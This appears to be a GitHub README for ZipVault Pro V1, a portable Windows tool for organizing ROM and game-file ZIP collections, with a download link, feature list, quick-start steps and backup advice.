# ZipVault Pro V1

**ZipVault Pro** is a Windows utility for organizing ROM and game-file collections. It provides ZIP tools, duplicate checking, ROM-extension support, game-title support, and preview tools to help users review and organize local game files more safely.

> **Important:** ZipVault Pro does not include ROMs, BIOS files, games, or emulators. Always test file-organizing operations on copied files before using your main collection.

## Download

### [Download ZipVault Pro V1 (.zip)](https://github.com/akaidragon123k/ZipVault-Pro-V1/raw/refs/heads/main/zipvault_pro%20V1.zip)

No installer is required for this version. Download the ZIP, extract it, and run `ZipVault Pro.exe`.

## What ZipVault Pro Does

- Organizes Windows ROM and game-file collections
- Provides ZIP-file tools
- Helps check for duplicate files
- Supports ROM-file extensions
- Supports game-title information
- Provides preview tools before making changes
- Runs as a portable ZIP package

## Quick Start

1. Download **ZipVault Pro V1** using the link above.
2. Extract the ZIP file to a folder on your computer.
3. Keep `game title.zip` in the same folder as the application if ZipVault Pro needs it.
4. Run `ZipVault Pro.exe`.
5. Test the program on **copied files first** before using your main ROM or game collection.

## Who It Is For

ZipVault Pro is intended for Windows users who manage ROM libraries, retro-gaming collections, archived game files, or other game-related ZIP collections and want an easier way to organize, review, and check their files.

## Safety

ZipVault Pro works with files on your computer. Before using it on an important collection:

- Make a backup or work with copied files.
- Preview and verify results before making large changes.
- Keep an untouched copy of important ROM or game files whenever possible.

See the repository's [Security Policy](SECURITY.md) for additional safety information.
